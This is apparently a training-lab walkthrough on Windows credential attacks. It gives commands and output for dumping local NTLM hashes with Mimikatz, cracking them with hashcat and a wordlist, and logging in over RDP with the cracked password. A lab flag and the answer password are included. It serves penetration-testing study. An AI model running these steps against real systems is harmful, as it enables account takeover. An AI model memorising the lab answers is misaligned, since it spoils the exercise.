# Cracking NTLM

Showing all local users in PowerShell
>``` shell
>PS C:\Users\offsec> Get-LocalUser
>
># ========== Expected Result ==========
>Name               Enabled Description
>----               ------- -----------
>Administrator      False   Built-in account for administering the computer/domain
>DefaultAccount     False   A user account managed by the system.
>Guest              False   Built-in account for guest access to the computer/domain
>nelly              True
>offsec             True
>WDAGUtilityAccount False   A user account managed and used by the system for Windows Defender Application Guard scen...
>...
># =====================================
>```

Start PowerShell as Administrator
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/Cracking-NTLM-1.png)

Starting Mimikatz
>``` shell
>PS C:\Windows\system32> cd C:\tools
>
>PS C:\tools> ls
>
># ========== Expected Result ==========
>    Directory: C:\tools
>
>
>Mode                 LastWriteTime         Length Name
>----                 -------------         ------ ----
>-a----         5/31/2022  12:25 PM        1355680 mimikatz.exe
># =====================================
>
>PS C:\tools> .\mimikatz.exe
>
># ========== Expected Result ==========
>  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
> .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
> ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
> ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
> '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
>  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
>
>mimikatz #
># =====================================
>```

Enabling SeDebugPrivilege, elevating to SYSTEM user privileges and extracting NTLM hashes
>``` shell
>mimikatz # privilege::debug
>
># ========== Expected Result ==========
>Privilege '20' OK
># =====================================
>
>mimikatz # token::elevate
>
># ========== Expected Result ==========
>Token Id  : 0
>User name :
>SID name  : NT AUTHORITY\SYSTEM
>
>656     {0;000003e7} 1 D 34811          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
> -> Impersonated !
> * Process Token : {0;000413a0} 1 F 6146616     MARKETINGWK01\offsec    S-1-5-21-4264639230-2296035194-3358247000-1001  (14g,24p)       Primary
> * Thread Token  : {0;000003e7} 1 D 6217216     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)
># =====================================
>
>mimikatz # lsadump::sam
>
># ========== Expected Result ==========
>Domain : MARKETINGWK01
>SysKey : 2a0e15573f9ce6cdd6a1c62d222035d5
>Local SID : S-1-5-21-4264639230-2296035194-3358247000
> 
>RID  : 000003e9 (1001)
>User : offsec
>  Hash NTLM: 2892d26cdf84d7a70e2eb3b9f05c425e
> 
>RID  : 000003ea (1002)
>User : nelly
>  Hash NTLM: 3ae8e5f0ffabb3a627672e1600f1ba10
>...
># =====================================
>```

NTLM hash of user nelly in nelly.hash
>``` shell
>kali@kali:~/passwordattacks$ cat nelly.hash
>
># ========== Expected Result ==========
>3ae8e5f0ffabb3a627672e1600f1ba10
># =====================================
>```

Hashcat mode for NTLM hashes
>``` shell
>kali@kali:~/passwordattacks$ hashcat --help | grep -i "ntlm"
>
># ========== Expected Result ==========
>   5500 | NetNTLMv1 / NetNTLMv1+ESS                           | Network Protocol
>  27000 | NetNTLMv1 / NetNTLMv1+ESS (NT)                      | Network Protocol
>   5600 | NetNTLMv2                                           | Network Protocol
>  27100 | NetNTLMv2 (NT)                                      | Network Protocol
>   1000 | NTLM                                                | Operating System
># =====================================
>```

NTLM hash of user nelly in nelly.hash and Hashcat mode
>``` shell
>kali@kali:~/passwordattacks$ hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule --force
>
># ========== Expected Result ==========
>hashcat (v6.2.5) starting
>...
>3ae8e5f0ffabb3a627672e1600f1ba10:nicole1                  
>                                                          
>Session..........: hashcat
>Status...........: Cracked
>Hash.Mode........: 1000 (NTLM)
>Hash.Target......: 3ae8e5f0ffabb3a627672e1600f1ba10
>Time.Started.....: Thu Jun  2 04:11:28 2022, (0 secs)
>Time.Estimated...: Thu Jun  2 04:11:28 2022, (0 secs)
>Kernel.Feature...: Pure Kernel
>Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
>Guess.Mod........: Rules (/usr/share/hashcat/rules/best66.rule)
>Guess.Queue......: 1/1 (100.00%)
>Speed.#1.........: 17926.2 kH/s (2.27ms) @ Accel:256 Loops:77 Thr:1 Vec:8
>...
># =====================================
>```

RDP Connection as nelly
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/Cracking-NTLM-2.png)

Lab 1 - Follow the steps outlined in this section and find the flag on the nelly user's desktop on VM #1 (MARKETINGWK01).
>``` shell
># 1) RDP into the target as the provided low-priv user (initial foothold)
>kali@kali:~$ xfreerdp3 /u:offsec /p:lab /v:192.168.241.210 /cert:ignore
>
># 2) (On the Windows target) Run PowerShell "As Administrator" to allow credential dumping
>
># 3) Enumerate local users to confirm the target user (nelly) exists and is enabled
>PS C:\Windows\system32> Get-LocalUser
>
># 4) Move to the tools directory where mimikatz is stored
>PS C:\Windows\system32> cd C:\tools
>
># 5) Confirm mimikatz.exe is present
>PS C:\tools> ls
>
># 6) Launch mimikatz
>PS C:\tools> .\mimikatz.exe
>
># 7) Enable SeDebugPrivilege (required for many privileged actions)
>mimikatz # privilege::debug
>
># 8) Elevate / impersonate SYSTEM to gain maximum local privileges
>mimikatz # token::elevate
>
># 9) Dump local SAM database hashes (extract NTLM hashes for local users, including nelly)
>mimikatz # lsadump::sam
>
># 10) (Back on Kali) Save nelly's NTLM hash to a file for offline cracking
>kali@kali:~$ cat > nelly.hash << EOF
>3ae8e5f0ffabb3a627672e1600f1ba10
>EOF
>
># 11) Confirm the correct hashcat mode for NTLM (should show "1000 | NTLM")
>kali@kali:~$ hashcat --help | grep -i ntlm
>
># 12) Crack the NTLM hash offline using rockyou + common mutation rules (best64)
>kali@kali:~$ hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt \
>-r /usr/share/hashcat/rules/best64.rule
>
># 13) Display the cracked password from hashcat's potfile (shows hash:plaintext)
>kali@kali:~$ hashcat -m 1000 nelly.hash --show
>
># 14) RDP into the target system as nelly using the cracked NTLM password
>kali@kali:~$ xfreerdp3 /u:nelly /p:nicole1 /v:192.168.241.210 /cert:ignore
>
># 15) Navigate to nelly's Desktop where the flag is stored
>PS C:\Windows\system32> cd C:\Users\nelly\Desktop
>
># 16) List files on the Desktop to identify the flag
>PS C:\Users\nelly\Desktop> ls
>
># 17) Display the contents of the flag file to complete the lab
>PS C:\Users\nelly\Desktop> type flag.txt
>```
>OS{251d3e79de2a2f9ad4cb9551f18b6f81}

Lab 2 - Access VM #2 via RDP as user nadine with the password retrieved in the exercise of the section labeled "Password Manager" and leverage the methods from this section to extract Steve's NTLM hash. Use best66.rule for the cracking process and enter the plain text password as answer to this exercise.
>``` shell
>
>```
>
